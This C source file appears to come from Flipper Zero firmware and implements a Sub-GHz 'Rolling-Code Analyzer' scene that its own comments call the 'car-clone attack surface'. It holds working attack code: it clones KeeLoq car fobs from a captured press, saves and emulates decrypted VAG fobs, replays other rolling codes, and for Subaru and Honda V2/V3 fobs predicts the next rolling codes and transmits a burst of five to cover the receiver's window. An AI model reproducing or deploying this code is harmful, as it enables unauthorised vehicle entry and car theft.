#include "../subghz_i.h"

#include "applications/main/subghz/helpers/subghz_txrx_i.h"
#include "../helpers/subghz_txrx_create_protocol_key.h"
#include "../helpers/subghz_rollback.h"
#include <lib/subghz/blocks/generic.h>
#include <lib/subghz/protocols/keeloq.h>
#include <lib/subghz/protocols/vag.h>
#include <lib/subghz/protocols/subaru.h>
#include <lib/subghz/protocols/honda_v2_v3.h>
#include <lib/subghz/protocols/protocols_common.h> // FF_CNT field name
#include <lib/flipper_format/flipper_format.h>
#include <string.h>

// One-action next-code burst: how many consecutive codes to fire, and how long
// to hold each on-air before advancing. Covers a receiver's forward window in
// one press (Subaru single-capture; Honda Rolling-PWN consecutive sequence).
#define SUBGHZ_PREDICT_BURST_N        5U
#define SUBGHZ_PREDICT_BURST_DWELL_MS 260U

// Rolling-Code Analyzer = the car-clone attack surface (clone/save/emulate a
// CAPTURED rolling fob). PRIVATE builds only — reached from the analyze scene's
// guarded Details spoke. The general KeeLoq builder (Add Manually) stays public.
#ifndef PUBLIC_BUILD

#define TAG "SubGhzSceneRollingAnalyzer"

// Read-only Rolling-Code Analyzer.
//
// Mirrors the receiver-info scene's structure but renders a structured summary
// of an already-decoded DYNAMIC (rolling-code) capture: protocol, manufacturer,
// serial, button, counter, bit length, plus a plain-language verdict. It does
// NOT transmit, re-decode, or mutate the capture — it only reads the fields the
// decoder already produced.
//
// The generic block deserialize (subghz_block_generic_deserialize) only recovers
// `data` + `data_count_bit` from the saved .sub; the serial / button / counter /
// manufacturer are derived by the protocol decoder at decode time and surfaced
// through subghz_protocol_decoder_base_get_string(). For the KeeLoq family that
// string carries "Fix:0x........" (fixed code = btn<<28 | serial), "Cnt:XXXX"
// (or "Cnt:????" when no manufacturer key matched) and "MF:<name>" (or
// "MF:Unknown"). We parse those authoritative values rather than re-deriving them.

// Field parsing (hex-after / MF: extraction) is shared with the RollBack feature
// via the host-tested pure core in subghz_rollback_core.c — see
// subghz_rollback_hex_after() / subghz_rollback_manufacturer().

// Stable storage for the manufacturer name pulled off a decoded capture.
// GenInfo.keeloq.manuf is a `const char*` that must outlive this scene, and the
// KeeLoq decoder's own manufacture_name pointer (private to keeloq.c — the struct
// is defined only in that .c file, not exposed via keeloq.h) can be reused/
// mutated by the next decode. Mirrors subghz_scene_keeloq_mfr.c's
// subghz_keeloq_mfr_selected buffer.
static char subghz_scene_rolling_analyzer_clone_manuf[24];

// Clone-from-capture gate, built from the same decoded-text markers this scene
// already parses for its own display (Fix:/Cnt:/MF:) — see the file banner above
// for why those markers, not the decoder's private fields, are the accessor.
// True only for a KeeLoq rolling capture whose manufacturer key matched (MF !=
// "Unknown") and whose counter was actually recovered via the literal "Cnt:"
// marker.
//
// Two manufacturer families are excluded even though they otherwise look
// "decoded" (has_mf true, MF != "Unknown"):
//   - "BFT" / "Erreka" (SECURE learning). keeloq.c's get_string() format for
//     these is "...MF:%s Sd:%08lX" with NO separator between the name and
//     " Sd:", so subghz_rollback_manufacturer() would capture "BFT Sd:1A2B3C4D"
//     as one string and an exact strcmp("BFT") would silently fail to exclude
//     it. Guard on the raw text ("MF:BFT" / "MF:Erreka") instead, the same way
//     "MF:Unknown" is already checked below. These mfrs also need a
//     programming-mode seed a normal button press never carries, so cloning
//     from a capture isn't possible for them regardless (no-desync-clone design
//     spec: seed-only mfrs).
//   - "AN-Motors": its get_string() branch prints "PsCn:%04lX" (pseudo-counter),
//     never the literal "Cnt:" marker, so subghz_rollback_hex_after(t, "Cnt:")
//     would silently return 0 instead of a real value. Requiring "Cnt:" to be
//     present excludes it along with anything else lacking a real recovered
//     counter.
static bool
    subghz_scene_rolling_analyzer_can_clone(const char* protocol_name, const char* decoded_text) {
    if(!protocol_name || strcmp(protocol_name, SUBGHZ_PROTOCOL_KEELOQ_NAME) != 0) return false;
    if(!decoded_text) return false;
    return strstr(decoded_text, "MF:Unknown") == NULL &&
           strstr(decoded_text, "MF:BFT") == NULL && strstr(decoded_text, "MF:Erreka") == NULL &&
           strstr(decoded_text, "Cnt:") != NULL && strstr(decoded_text, "Cnt:????") == NULL;
}

// VAG (AUT64) save gate. VAG's get_string carries "Ser:" only when the frame
// decrypted with a known key; an undecrypted frame prints "Key2:.. (corrupted)".
// True for a decrypted VAG capture (all fields present for a full .sub + emulate).
static bool subghz_scene_rolling_analyzer_can_save_vag(
    const char* protocol_name,
    const char* decoded_text) {
    if(!protocol_name || strcmp(protocol_name, VAG_PROTOCOL_NAME) != 0) return false;
    if(!decoded_text) return false;
    return strstr(decoded_text, "Ser:") != NULL && strstr(decoded_text, "corrupted") == NULL;
}

// Generic replay-save gate (PRIVATE-only): any serializable fob that is NOT KeeLoq
// or VAG (those have their own smart-clone / emulate paths above). These can be
// saved to the Garage as a plain .sub and re-sent via the Transmitter, but with NO
// future-code generation — for a rolling fob that is a single-use REPLAY (labelled).
#ifndef PUBLIC_BUILD
static bool subghz_scene_rolling_analyzer_can_save_generic(
    const char* protocol_name,
    SubGhzProtocolDecoderBase* decoder) {
    if(!protocol_name || !decoder || !decoder->protocol) return false;
    if(strcmp(protocol_name, SUBGHZ_PROTOCOL_KEELOQ_NAME) == 0) return false;
    if(strcmp(protocol_name, VAG_PROTOCOL_NAME) == 0) return false;
    return (decoder->protocol->flag & SubGhzProtocolFlag_Save) == SubGhzProtocolFlag_Save;
}

// Next-code prediction gate (PRIVATE-only): keyless-PREDICTABLE dynamic fobs whose
// codec rebuilds a valid frame from (serial, cnt) with NO manufacturer secret, so
// we can synthesize the next rolling code(s) from a single capture. Confirmed
// keyless: Subaru (Wimmenhove predictable counter) and Honda V2/V3 (Rolling-PWN
// family — honda_v2/v3_pack_generic re-derive the frame from serial+counter).
// Crypto rolling fobs (KeeLoq/VAG/etc.) are excluded — they need the real key, so
// they fall through to their own clone/emulate or single-replay paths.
static bool subghz_scene_rolling_analyzer_can_predict(const char* protocol_name) {
    if(!protocol_name) return false;
    return strcmp(protocol_name, SUBARU_PROTOCOL_NAME) == 0 ||
           strcmp(protocol_name, SUBGHZ_PROTOCOL_HONDA_V2_V3_NAME) == 0;
}
#endif

static void subghz_scene_rolling_analyzer_button_callback(
    GuiButtonType result,
    InputType type,
    void* context) {
    furi_assert(context);
    SubGhz* subghz = context;
    if((result == GuiButtonTypeCenter) && (type == InputTypeShort)) {
        view_dispatcher_send_custom_event(
            subghz->view_dispatcher, SubGhzCustomEventSceneRollingAnalyzerClone);
    } else if((result == GuiButtonTypeRight) && (type == InputTypeShort)) {
        view_dispatcher_send_custom_event(
            subghz->view_dispatcher, SubGhzCustomEventSceneRollingAnalyzerSave);
    }
}

// Predict-fob buttons: Center = single next code (advances one per press),
// Left = one-action burst of the next N codes. Kept separate from the KeeLoq
// clone callback so the Center slot means "Next" (not "Clone") for these fobs.
static void subghz_scene_rolling_analyzer_predict_button_callback(
    GuiButtonType result,
    InputType type,
    void* context) {
    furi_assert(context);
    SubGhz* subghz = context;
    if((result == GuiButtonTypeCenter) && (type == InputTypeShort)) {
        view_dispatcher_send_custom_event(
            subghz->view_dispatcher, SubGhzCustomEventSceneRollingAnalyzerNext);
    } else if((result == GuiButtonTypeLeft) && (type == InputTypeShort)) {
        view_dispatcher_send_custom_event(
            subghz->view_dispatcher, SubGhzCustomEventSceneRollingAnalyzerBurst);
    }
}

void subghz_scene_rolling_analyzer_on_enter(void* context) {
    SubGhz* subghz = context;

    widget_reset(subghz->widget);

    // Re-load + deserialize the selected capture so the analyzer is self-contained
    // and does not depend on the receiver's live decoder state (mirrors how the
    // receiver-info scene re-parses before it acts). Read-only: no TX, no mutation.
    bool loaded = subghz_txrx_load_decoder_by_name_protocol(
        subghz->txrx,
        subghz_history_get_protocol_name(subghz->history, subghz->idx_menu_chosen));
    FlipperFormat* fff = subghz_history_get_raw_data(subghz->history, subghz->idx_menu_chosen);
    if(loaded && fff) {
        subghz_protocol_decoder_base_deserialize(subghz_txrx_get_decoder(subghz->txrx), fff);
    }

    SubGhzProtocolDecoderBase* decoder = subghz_txrx_get_decoder(subghz->txrx);

    widget_add_string_element(
        subghz->widget, 64, 0, AlignCenter, AlignTop, FontPrimary, "Rolling Code");

    if(!decoder || !decoder->protocol || !fff) {
        widget_add_string_element(
            subghz->widget, 0, 16, AlignLeft, AlignTop, FontSecondary, "No capture to analyze.");
        view_dispatcher_switch_to_view(subghz->view_dispatcher, SubGhzViewIdWidget);
        return;
    }

    // Structured fields the saved capture carries directly.
    SubGhzBlockGeneric generic = {0};
    subghz_block_generic_deserialize(&generic, fff);
    uint16_t data_count_bit = generic.data_count_bit;

    // Authoritative decoded text (serial / counter / manufacturer live here).
    FuriString* text = furi_string_alloc();
    subghz_protocol_decoder_base_get_string(decoder, text);
    const char* decoded_text = furi_string_get_cstr(text);

    const char* protocol_name = decoder->protocol->name;

    char manufacturer[24] = {0};
    bool has_mf = subghz_rollback_manufacturer(decoded_text, manufacturer, sizeof(manufacturer));

    // "decoded" = a manufacturer key matched: MF present and not "Unknown", and
    // the counter was not left as the "????" not-decodable placeholder.
    bool decoded = has_mf && (strstr(decoded_text, "MF:Unknown") == NULL) &&
                   (strstr(decoded_text, "Cnt:????") == NULL);

    uint32_t fix = subghz_rollback_hex_after(decoded_text, "Fix:");
    uint32_t serial = fix & 0x0FFFFFFF;
    uint8_t btn = (uint8_t)((fix >> 28) & 0x0F);
    uint32_t cnt = subghz_rollback_hex_after(decoded_text, "Cnt:");

    // VAG (AUT64) uses a different get_string format (no Fix:/MF: markers), so the
    // KeeLoq parse above yields SN:0 / "key unknown". Parse VAG's own Ser:/Cnt:/Btn:
    // and show the vehicle name so the summary is correct for VAG captures.
    if(protocol_name && strcmp(protocol_name, VAG_PROTOCOL_NAME) == 0) {
        decoded = (strstr(decoded_text, "Ser:") != NULL) &&
                  (strstr(decoded_text, "corrupted") == NULL);
        serial = subghz_rollback_hex_after(decoded_text, "Ser:");
        cnt = subghz_rollback_hex_after(decoded_text, "Cnt:");
        btn = (uint8_t)subghz_rollback_hex_after(decoded_text, "Btn:");
        snprintf(
            manufacturer,
            sizeof(manufacturer),
            "%.*s",
            (int)strcspn(decoded_text, " \r\n"),
            decoded_text); // vehicle name = leading token (VW/Audi/Seat/Skoda)
    }

    FuriString* body = furi_string_alloc();
    furi_string_cat_printf(body, "Proto: %s\n", protocol_name ? protocol_name : "?");
    furi_string_cat_printf(body, "MF: %s\n", decoded ? manufacturer : "key unknown");
    furi_string_cat_printf(body, "SN:0x%08lX  Btn:%d\n", (unsigned long)serial, (int)btn);
    furi_string_cat_printf(
        body, "Cnt:0x%04lX (%lu)\n", (unsigned long)cnt, (unsigned long)cnt);
    furi_string_cat_printf(body, "Bits:%d", (int)data_count_bit);

    widget_add_string_multiline_element(
        subghz->widget, 0, 13, AlignLeft, AlignTop, FontSecondary, furi_string_get_cstr(body));

    const char* verdict;
    if(subghz_scene_rolling_analyzer_can_predict(protocol_name)) {
        verdict = "Predictable: Next=+1 code, Burst=next N (single capture).";
    } else if(decoded) {
        verdict = "Rolling: raw replay rejected; TX re-advances counter.";
    } else {
        verdict = "Rolling: mfr key unknown - counter not decodable. Add key to keeloq_mfcodes_user.";
    }
    widget_add_string_multiline_element(
        subghz->widget, 0, 51, AlignLeft, AlignTop, FontSecondary, verdict);

    // Only slot in use above is text; all three button slots are free here, so
    // no collision risk (unlike receiver-info's widget, whose Left/Center/Right
    // are already spoken for by ID/Send/Save on every KeeLoq capture).
    if(subghz_scene_rolling_analyzer_can_clone(protocol_name, decoded_text)) {
        widget_add_button_element(
            subghz->widget,
            GuiButtonTypeCenter,
            "Clone",
            subghz_scene_rolling_analyzer_button_callback,
            subghz);
        widget_add_button_element(
            subghz->widget,
            GuiButtonTypeRight,
            "Save",
            subghz_scene_rolling_analyzer_button_callback,
            subghz);
    } else if(subghz_scene_rolling_analyzer_can_save_vag(protocol_name, decoded_text)) {
        // VAG: Save == clone-to-Garage-and-emulate (no separate KeeLoq gen step).
        widget_add_button_element(
            subghz->widget,
            GuiButtonTypeRight,
            "Save",
            subghz_scene_rolling_analyzer_button_callback,
            subghz);
    }
#ifndef PUBLIC_BUILD
    else if(subghz_scene_rolling_analyzer_can_predict(protocol_name)) {
        // Keyless-predictable fob: synthesize the next rolling code(s) from this
        // single capture. Center "Next" = +1 code per press; Left "Burst" = the
        // next N consecutive codes in one action; Right "Save" = plain capture.
        widget_add_button_element(
            subghz->widget,
            GuiButtonTypeLeft,
            "Burst",
            subghz_scene_rolling_analyzer_predict_button_callback,
            subghz);
        widget_add_button_element(
            subghz->widget,
            GuiButtonTypeCenter,
            "Next",
            subghz_scene_rolling_analyzer_predict_button_callback,
            subghz);
        widget_add_button_element(
            subghz->widget,
            GuiButtonTypeRight,
            "Save",
            subghz_scene_rolling_analyzer_button_callback,
            subghz);
    } else if(subghz_scene_rolling_analyzer_can_save_generic(protocol_name, decoder)) {
        // Any other serializable fob: Save to Garage as a plain replay (single-use
        // for rolling codes — no future-code generation for these protocols).
        widget_add_button_element(
            subghz->widget,
            GuiButtonTypeRight,
            "Save",
            subghz_scene_rolling_analyzer_button_callback,
            subghz);
    }
#endif

    furi_string_free(body);
    furi_string_free(text);

    view_dispatcher_switch_to_view(subghz->view_dispatcher, SubGhzViewIdWidget);
}

bool subghz_scene_rolling_analyzer_on_event(void* context, SceneManagerEvent event) {
    SubGhz* subghz = context;

    // Next-code prediction (keyless-predictable dynamic fobs): synthesize + TX the
    // next rolling code(s). Center "Next" = one code, advancing +1 per press; Left
    // "Burst" = the next N codes fired back-to-back in one action. The keyless codec
    // rebuilds a valid frame from (serial, cnt), so overriding just the Cnt field in
    // the serialized capture yields a valid future code the receiver will accept.
    if(event.type == SceneManagerEventTypeCustom &&
       (event.event == SubGhzCustomEventSceneRollingAnalyzerNext ||
        event.event == SubGhzCustomEventSceneRollingAnalyzerBurst)) {
        const bool burst = (event.event == SubGhzCustomEventSceneRollingAnalyzerBurst);

        subghz->state_notifications = SubGhzNotificationStateIDLE;
        subghz_txrx_hopper_set_state(subghz->txrx, SubGhzHopperStateOFF);
        subghz_txrx_stop(subghz->txrx);

        bool loaded = subghz_txrx_load_decoder_by_name_protocol(
            subghz->txrx,
            subghz_history_get_protocol_name(subghz->history, subghz->idx_menu_chosen));
        FlipperFormat* fff =
            subghz_history_get_raw_data(subghz->history, subghz->idx_menu_chosen);
        SubGhzProtocolDecoderBase* decoder = subghz_txrx_get_decoder(subghz->txrx);
        if(loaded && fff && decoder) {
            subghz_protocol_decoder_base_deserialize(decoder, fff);
        }
        if(!loaded || !fff || !decoder || !decoder->protocol ||
           !subghz_scene_rolling_analyzer_can_predict(decoder->protocol->name)) {
            return false;
        }

        SubGhzRadioPreset* hp =
            subghz_history_get_radio_preset(subghz->history, subghz->idx_menu_chosen);
        SubGhzRadioPreset preset = hp ? *hp : subghz_txrx_get_preset(subghz->txrx);

        // Serialize the capture (Protocol/Serial/Btn/Cnt/Key/Preset), then override
        // only Cnt — the encoder re-derives the whole frame from (serial, cnt).
        FlipperFormat* ff = flipper_format_string_alloc();
        bool ok =
            (subghz_protocol_decoder_base_serialize(decoder, ff, &preset) ==
             SubGhzProtocolStatusOk);
        uint32_t base_cnt = 0;
        if(ok) {
            flipper_format_rewind(ff);
            if(!flipper_format_read_uint32(ff, FF_CNT, &base_cnt, 1)) base_cnt = 0;
        }

        FuriString* path = furi_string_alloc();
        furi_string_printf(
            path, "%s/garage/predict_%s.sub", SUBGHZ_APP_FOLDER, decoder->protocol->name);

        if(ok && !burst) {
            // NEXT: one code. Offset advances +1 per press; scene state persists across
            // Transmitter round-trips and auto-resets to 0 on a fresh scene entry.
            uint32_t off = scene_manager_get_scene_state(
                subghz->scene_manager, SubGhzSceneRollingAnalyzer);
            off++;
            scene_manager_set_scene_state(
                subghz->scene_manager, SubGhzSceneRollingAnalyzer, off);
            uint32_t next_cnt = base_cnt + off;
            flipper_format_insert_or_update_uint32(ff, FF_CNT, &next_cnt, 1);
            ok = subghz_save_protocol_to_file(subghz, ff, furi_string_get_cstr(path)) &&
                 subghz_key_load(subghz, furi_string_get_cstr(path), false);
            furi_string_free(path);
            flipper_format_free(ff);
            if(ok) {
                scene_manager_next_scene(subghz->scene_manager, SubGhzSceneTransmitter);
                return true;
            }
            return false;
        }

        if(ok && burst) {
            // BURST: fire cnt+1 .. cnt+N back-to-back, each held on-air DWELL ms.
            // Blocks briefly (~N*DWELL) — a deliberate single-shot attack action.
            for(uint32_t i = 1; i <= SUBGHZ_PREDICT_BURST_N; i++) {
                uint32_t c = base_cnt + i;
                flipper_format_insert_or_update_uint32(ff, FF_CNT, &c, 1);
                if(!subghz_save_protocol_to_file(subghz, ff, furi_string_get_cstr(path))) break;
                if(!subghz_key_load(subghz, furi_string_get_cstr(path), false)) break;
                if(subghz_tx_start(subghz, subghz_txrx_get_fff_data(subghz->txrx))) {
                    furi_delay_ms(SUBGHZ_PREDICT_BURST_DWELL_MS);
                    subghz_txrx_stop(subghz->txrx);
                }
            }
            furi_string_free(path);
            flipper_format_free(ff);
            return true;
        }

        furi_string_free(path);
        flipper_format_free(ff);
        return false;
    }

    if(event.type == SceneManagerEventTypeCustom &&
       (event.event == SubGhzCustomEventSceneRollingAnalyzerClone ||
        event.event == SubGhzCustomEventSceneRollingAnalyzerSave)) {
        bool do_save = (event.event == SubGhzCustomEventSceneRollingAnalyzerSave);
        // Stop RX/hopper before handing off — SetJump's byte-input result calls
        // subghz_txrx_gen_keeloq_clone() and routes to the Transmitter, so the
        // radio needs to be idle (mirrors receiver-info's Save handler).
        subghz->state_notifications = SubGhzNotificationStateIDLE;
        subghz_txrx_hopper_set_state(subghz->txrx, SubGhzHopperStateOFF);
        subghz_txrx_stop(subghz->txrx);

        // Re-load + deserialize the selected capture fresh: the RX hopper may
        // have reassigned the shared decoder to a different capture since this
        // screen was drawn (on_enter loaded it but did not stop RX — it's a
        // read-only view, same as this scene's own header comment notes).
        bool loaded = subghz_txrx_load_decoder_by_name_protocol(
            subghz->txrx,
            subghz_history_get_protocol_name(subghz->history, subghz->idx_menu_chosen));
        FlipperFormat* fff =
            subghz_history_get_raw_data(subghz->history, subghz->idx_menu_chosen);
        SubGhzProtocolDecoderBase* decoder = subghz_txrx_get_decoder(subghz->txrx);
        if(loaded && fff && decoder) {
            subghz_protocol_decoder_base_deserialize(decoder, fff);
        }
        if(!loaded || !fff || !decoder || !decoder->protocol) {
            return false;
        }

        FuriString* text = furi_string_alloc();
        subghz_protocol_decoder_base_get_string(decoder, text);
        const char* t = furi_string_get_cstr(text);

        // VAG: serialize the decrypted frame straight to the Garage (no KeeLoq gen
        // step), load it back into fff_data, and open the fob on it (no-desync
        // emulate resumes from there). Both Clone and Save land here for VAG.
        if(subghz_scene_rolling_analyzer_can_save_vag(decoder->protocol->name, t)) {
            uint32_t vser = subghz_rollback_hex_after(t, "Ser:");
            char vmake[24];
            snprintf(vmake, sizeof(vmake), "%.*s", (int)strcspn(t, " \r\n"), t);
            furi_string_free(text);

            SubGhzRadioPreset* hp =
                subghz_history_get_radio_preset(subghz->history, subghz->idx_menu_chosen);
            SubGhzRadioPreset preset = hp ? *hp : subghz_txrx_get_preset(subghz->txrx);
            FlipperFormat* ff = flipper_format_string_alloc();
            bool ok =
                (subghz_protocol_decoder_base_serialize(decoder, ff, &preset) ==
                 SubGhzProtocolStatusOk);
            if(ok) {
                FuriString* path = furi_string_alloc();
                furi_string_printf(
                    path,
                    "%s/garage/%s_%08lX.sub",
                    SUBGHZ_APP_FOLDER,
                    (vmake[0] ? vmake : "VAG"),
                    (unsigned long)vser);
                ok = subghz_save_protocol_to_file(subghz, ff, furi_string_get_cstr(path)) &&
                     subghz_key_load(subghz, furi_string_get_cstr(path), false);
                if(ok) subghz->keeloq_fob_from_garage = true;
                furi_string_free(path);
            }
            flipper_format_free(ff);
            if(ok) {
                scene_manager_next_scene(subghz->scene_manager, SubGhzSceneKeeloqFob);
                return true;
            }
            return false;
        }

        // Generic serializable fob (non-KeeLoq/non-VAG): serialize the capture to
        // the Garage as a plain .sub and hand off to the Transmitter for replay.
        // No future-code generation — single-use replay for rolling codes. PRIVATE.
#ifndef PUBLIC_BUILD
        if(subghz_scene_rolling_analyzer_can_save_generic(decoder->protocol->name, decoder)) {
            const char* pname = decoder->protocol->name;
            uint32_t sn = subghz_rollback_hex_after(t, "Fix:") & 0x0FFFFFFF;
            if(sn == 0) sn = subghz_rollback_hex_after(t, "Ser:");
            furi_string_free(text);

            SubGhzRadioPreset* hp =
                subghz_history_get_radio_preset(subghz->history, subghz->idx_menu_chosen);
            SubGhzRadioPreset preset = hp ? *hp : subghz_txrx_get_preset(subghz->txrx);
            FlipperFormat* ff = flipper_format_string_alloc();
            bool ok =
                (subghz_protocol_decoder_base_serialize(decoder, ff, &preset) ==
                 SubGhzProtocolStatusOk);
            if(ok) {
                FuriString* path = furi_string_alloc();
                furi_string_printf(
                    path,
                    "%s/garage/%s_%08lX.sub",
                    SUBGHZ_APP_FOLDER,
                    pname,
                    (unsigned long)sn);
                ok = subghz_save_protocol_to_file(subghz, ff, furi_string_get_cstr(path)) &&
                     subghz_key_load(subghz, furi_string_get_cstr(path), false);
                furi_string_free(path);
            }
            flipper_format_free(ff);
            if(ok) {
                scene_manager_next_scene(subghz->scene_manager, SubGhzSceneTransmitter);
                return true;
            }
            return false;
        }
#endif

        if(!subghz_scene_rolling_analyzer_can_clone(decoder->protocol->name, t)) {
            furi_string_free(text);
            return false; // guard: never seed gen_info from an ungated capture
        }

        uint32_t fix = subghz_rollback_hex_after(t, "Fix:");
        uint32_t cnt = subghz_rollback_hex_after(t, "Cnt:");
        char mf[24] = {0};
        subghz_rollback_manufacturer(t, mf, sizeof(mf));
        furi_string_free(text);

        strncpy(
            subghz_scene_rolling_analyzer_clone_manuf,
            mf,
            sizeof(subghz_scene_rolling_analyzer_clone_manuf) - 1);
        subghz_scene_rolling_analyzer_clone_manuf
            [sizeof(subghz_scene_rolling_analyzer_clone_manuf) - 1] = '\0';

        SubGhzRadioPreset* preset =
            subghz_history_get_radio_preset(subghz->history, subghz->idx_menu_chosen);

        subghz->gen_info->type = GenKeeloq;
        subghz->gen_info->mod = "AM650"; // KeeLoq is AM-only (SubGhzProtocolFlag_AM in keeloq.c)
        subghz->gen_info->freq = preset ? preset->frequency : 433920000;
        subghz->gen_info->keeloq.serial = fix & 0x0FFFFFFF;
        subghz->gen_info->keeloq.btn = (uint8_t)((fix >> 28) & 0x0F);
        subghz->gen_info->keeloq.cnt = (uint16_t)cnt;
        subghz->gen_info->keeloq.manuf = subghz_scene_rolling_analyzer_clone_manuf;

        if(do_save) {
            // Build the clone into fff_data and persist it to the Garage, then open
            // the fob on the just-built clone (from_garage => no rebuild).
            if(subghz_txrx_gen_keeloq_clone(
                   subghz->txrx,
                   subghz->gen_info->mod,
                   subghz->gen_info->freq,
                   subghz->gen_info->keeloq.serial,
                   subghz->gen_info->keeloq.btn,
                   subghz->gen_info->keeloq.cnt,
                   subghz->keeloq_clone_jump, /* 0 = no lead (desync-safe default) */
                   subghz->gen_info->keeloq.manuf)) {
                FuriString* path = furi_string_alloc();
                furi_string_printf(
                    path,
                    "%s/garage/%s_%08lX.sub",
                    SUBGHZ_APP_FOLDER,
                    (mf[0] ? mf : "Car"),
                    (unsigned long)(fix & 0x0FFFFFFF));
                subghz_save_protocol_to_file(
                    subghz, subghz_txrx_get_fff_data(subghz->txrx), furi_string_get_cstr(path));
                furi_string_free(path);
                subghz->keeloq_fob_from_garage = true;
            }
        } else {
            subghz->keeloq_clone_flow = true;
        }
        scene_manager_next_scene(subghz->scene_manager, SubGhzSceneKeeloqFob);
        return true;
    }
    // Otherwise read-only: Back is handled by the scene manager (returns to receiver-info).
    return false;
}

void subghz_scene_rolling_analyzer_on_exit(void* context) {
    SubGhz* subghz = context;
    widget_reset(subghz->widget);
}

#endif /* !PUBLIC_BUILD — car-clone attack surface, private only */
